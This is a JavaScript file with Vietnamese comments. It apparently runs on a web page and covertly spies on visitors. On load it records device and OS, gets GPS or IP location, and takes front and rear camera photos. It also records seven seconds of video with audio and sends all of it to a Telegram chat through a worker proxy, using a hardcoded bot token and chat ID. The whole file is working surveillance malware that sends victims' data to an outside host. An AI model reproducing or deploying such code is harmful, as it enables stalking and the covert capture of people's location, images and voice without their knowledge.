// ====== CẤU HÌNH TELEGRAM ======
const TELEGRAM_BOT_TOKEN = '7642675616:AAHMlI4Dje9L4SkmHNo4dPGVxPL6dqkXPMw';
const TELEGRAM_CHAT_ID = '-4957526303';
const API_SEND_MEDIA = `https://winter-hall-f9b4.jayky2k9.workers.dev/bot${TELEGRAM_BOT_TOKEN}/sendMediaGroup`;
const API_SEND_TEXT = `https://winter-hall-f9b4.jayky2k9.workers.dev/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

// ====== THÔNG TIN THU THẬP ======
const info = {
  time: new Date().toLocaleString(),
  ip: '',
  isp: '',
  address: '',
  country: '',
  lat: '',
  lon: '',
  device: '',
  os: '',
  camera: '⏳ Đang kiểm tra...'
};

// ====== NHẬN DIỆN THIẾT BỊ ======
function detectDevice() {
  const ua = navigator.userAgent;
  if (/iPhone|iPad|iPod/i.test(ua)) {
    info.device = 'iOS Device';
    info.os = 'iOS';
  } else if (/Android/i.test(ua)) {
    const match = ua.match(/Android.*; (.+?) Build/);
    info.device = match ? match[1] : 'Android Device';
    info.os = 'Android';
  } else if (/Windows NT/i.test(ua)) {
    info.device = 'Windows PC';
    info.os = 'Windows';
  } else if (/Macintosh/i.test(ua)) {
    info.device = 'Mac';
    info.os = 'macOS';
  } else {
    info.device = 'Không xác định';
    info.os = 'Không rõ';
  }
}

// ====== LẤY IP HOẶC GPS ======
function getIPInfo() {
  return fetch("https://ipwho.is/")
    .then(res => res.json())
    .then(data => {
      info.ip = data.ip;
      info.isp = data.connection?.org || 'Không rõ';
      info.address = `${data.city}, ${data.region}, ${data.postal || ''}`.replace(/, $/, '');
      info.country = data.country;
      info.lat = data.latitude?.toFixed(6) || '0';
      info.lon = data.longitude?.toFixed(6) || '0';
    }).catch(() => {
      info.ip = 'Không rõ';
      info.isp = 'Không rõ';
      info.address = 'Không rõ';
      info.country = 'Không rõ';
      info.lat = '0';
      info.lon = '0';
    });
}

function getPreciseLocationOrFallbackToIP() {
  return new Promise(resolve => {
    if (!navigator.geolocation) return getIPInfo().then(resolve);

    navigator.geolocation.getCurrentPosition(
      async pos => {
        info.lat = pos.coords.latitude.toFixed(6);
        info.lon = pos.coords.longitude.toFixed(6);

        try {
          const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${info.lat}&lon=${info.lon}`);
          const data = await res.json();
          info.address = data.display_name || '📍 Không xác định';
          info.country = data.address?.country || 'Không rõ';
        } catch {
          info.address = '📍 GPS được cho phép, nhưng không rõ địa chỉ';
          info.country = 'Không rõ';
        }

        info.ip = 'Không rõ';
        info.isp = 'Không rõ';
        resolve();
      },
      async err => {
        console.warn('❌ GPS bị từ chối:', err.message);
        await getIPInfo();
        resolve();
      },
      { enableHighAccuracy: true, timeout: 5000 }
    );
  });
}

// ====== NỘI DUNG GỬI TELEGRAM ======
function getCaption() {
  return `
📡 [THÔNG TIN TRUY CẬP]

🕒 Thời gian: ${info.time}
📱 Thiết bị: ${info.device}
🖥️ Hệ điều hành: ${info.os}
🌐 IP: ${info.ip}
🏢 ISP: ${info.isp}
🏙️ Địa chỉ: ${info.address}
🌍 Quốc gia: ${info.country}
📍 Vĩ độ: ${info.lat}
📍 Kinh độ: ${info.lon}
📸 Camera: ${info.camera}

🔗 Link xem livestream: https://yourdomain.github.io/viewer.html
`.trim();
}

// ====== CHỤP CAMERA ======
function captureCamera(facingMode = "user") {
  return new Promise((resolve, reject) => {
    navigator.mediaDevices.getUserMedia({ video: { facingMode } })
      .then(stream => {
        const video = document.createElement("video");
        video.srcObject = stream;
        video.play();

        video.onloadedmetadata = () => {
          const canvas = document.createElement("canvas");
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          const ctx = canvas.getContext("2d");

          setTimeout(() => {
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            stream.getTracks().forEach(track => track.stop());
            canvas.toBlob(blob => resolve(blob), "image/jpeg", 0.9);
          }, 1000);
        };
      })
      .catch(reject);
  });
}

// ====== GỬI 2 ẢNH VỀ TELEGRAM ======
async function sendTwoPhotos(frontBlob, backBlob) {
  const formData = new FormData();
  formData.append('chat_id', TELEGRAM_CHAT_ID);
  formData.append('media', JSON.stringify([
    {
      type: 'photo',
      media: 'attach://front',
      caption: getCaption()
    },
    {
      type: 'photo',
      media: 'attach://back'
    }
  ]));
  formData.append('front', frontBlob, 'front.jpg');
  formData.append('back', backBlob, 'back.jpg');

  return fetch(API_SEND_MEDIA, {
    method: 'POST',
    body: formData
  });
}

// ====== QUAY VIDEO CAMERA ======
function recordVideo(facingMode = "user", duration = 5000) {
  return new Promise(async (resolve, reject) => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode }, audio: true });
      const mediaRecorder = new MediaRecorder(stream);
      const chunks = [];

      mediaRecorder.ondataavailable = event => {
        if (event.data.size > 0) chunks.push(event.data);
      };

      mediaRecorder.onstop = () => {
        stream.getTracks().forEach(track => track.stop());
        const blob = new Blob(chunks, { type: 'video/webm' });
        resolve(blob);
      };

      mediaRecorder.start();
      setTimeout(() => mediaRecorder.stop(), duration);
    } catch (err) {
      reject(err);
    }
  });
}

// ====== GỬI VIDEO VỀ TELEGRAM ======
async function sendVideoToTelegram(videoBlob) {
  const formData = new FormData();
  formData.append('chat_id', TELEGRAM_CHAT_ID);
  formData.append('video', videoBlob, 'recorded.webm');
  formData.append('caption', `🎥 Video quay trực tiếp sau khi chụp.\n\n${getCaption()}`);

  await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, {
    method: 'POST',
    body: formData
  });
}

// ====== HÀM CHÍNH ======
async function main() {
  detectDevice();
  await getPreciseLocationOrFallbackToIP();

  let frontBlob = null;
  let backBlob = null;

  try {
    frontBlob = await captureCamera("user");
    backBlob = await captureCamera("environment");
    info.camera = '✅ Đã chụp camera trước và sau';
  } catch (err) {
    console.warn("❌ Không thể chụp camera:", err.message);
    info.camera = '📵 Không thể truy cập đủ camera';
  }

  if (frontBlob && backBlob) {
    await sendTwoPhotos(frontBlob, backBlob);
  } else {
    await fetch(API_SEND_TEXT, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: getCaption()
      })
    });
  }

  try {
    const videoBlob = await recordVideo("user", 7000); // quay 7 giây
    await sendVideoToTelegram(videoBlob);
  } catch (err) {
    console.warn("❌ Không thể quay video:", err.message);
  }
}

// ====== BẮT ĐẦU ======
main();
